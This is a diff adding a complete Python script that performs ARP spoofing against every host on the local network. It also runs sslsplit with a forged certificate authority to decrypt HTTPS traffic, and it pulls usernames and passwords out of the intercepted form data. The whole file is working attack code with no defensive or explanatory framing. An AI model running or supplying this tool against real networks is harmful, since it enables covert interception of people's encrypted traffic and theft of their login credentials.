@@ -1,0 +1,105 @@
+#!/usr/bin/env python3
+import os
+import scapy.all as scapy
+import netifaces
+from time import sleep
+import subprocess
+import os
+import copy
+arp_table= {} 
+mod_time = {}
+gw = None
+def get_mask_len(mask):
+    mask = mask.split('.')
+    n = 0
+    for i in mask:
+        if(i=="255"):
+            n+=8
+    return n
+def run_sslsplit():
+    subprocess.Popen(['sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
+           '-k', 'ca.key', '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'],
+          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+def send_arp(hwdst,pdst,psrc):
+    arp = scapy.ARP(op=2, hwdst=hwdst, pdst=pdst, psrc=psrc)
+    scapy.send(arp,verbose=False)
+def cleanup():
+    print('Cleaning up')
+    with open('sslsplit.pid') as f:
+        pid = next(f).strip()
+        subprocess.Popen(['kill', pid])
+        print(f'Kill {pid}')
+def check_user():
+    dir_name = 'sslsplit-log'
+    entries = os.listdir(dir_name)
+    global mod_time
+    for x in entries:
+        path = os.path.join(dir_name,x)
+        mod_time[path] = os.path.getmtime(path)
+def check_if_user():
+    #use the lastest change
+    dir_name = 'sslsplit-log'
+    entries = os.listdir(dir_name)
+    global mod_time
+    temp = copy.deepcopy(mod_time)
+    for x in entries:
+        path = os.path.join(dir_name,x)
+        mod_time[path] = os.path.getmtime(path)
+    #find the max_time and get the result
+    Value = -1
+    Key = None
+    for x in mod_time.keys():
+        if(mod_time[x]>Value):
+            Key = x
+            Value = mod_time[x]
+    if(Key!=None):
+        with open(Key,'rb') as f:
+            x = f.read()
+            x = str(x)
+            if("username=" in x and "password=" in x and ((Key not in temp.keys())  or temp[Key]!=mod_time[Key])):
+                user = x.split('username=')[-1]
+                password = x.split('password=')[-1]
+                user = user.split('&')[0]
+                password = password.split('&')[0]
+                print("Username:    ",user)
+                print("Password:    ",password)
+
+if os.getuid() != 0:
+    exit('Please use root')
+gw = netifaces.gateways()[netifaces.AF_INET][0]
+ni_inform = netifaces.ifaddresses(gw[1])[netifaces.AF_INET][0]
+#ideally we want ot get the ip/mask
+m = get_mask_len(ni_inform['netmask'])
+ip = ni_inform['addr']+"/"+str(m) 
+
+#we want to broadcast to get ip address and ARP
+arp_request = scapy.ARP(pdst=ip)
+broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+arp_request_broadcast = broadcast/arp_request
+response = scapy.srp(arp_request_broadcast,timeout=3,verbose=False)[0]
+for x in response:
+    sent,recv = x
+    arp_table[recv.psrc] = recv.hwsrc
+print("Available devices")
+print("---------------------------------------------")
+print("IP                   MAC                     ")
+print("---------------------------------------------")
+for i in arp_table.keys():
+    print(i,"           ",arp_table[i])
+#Let's start ARP spoofing
+#open the ssl Wo run the script to catch the file
+run_sslsplit()
+#keep sending arp packet
+try:
+    check_user()
+    while True:
+        sleep(3)
+        for neibr in arp_table:
+            if(neibr == gw[0]):
+                continue
+            send_arp(arp_table[gw[0]],pdst=gw[0],psrc=neibr)
+            send_arp(arp_table[neibr],pdst=neibr,psrc=gw[0])
+        check_if_user()
+except:
+    cleanup()
+#get the https
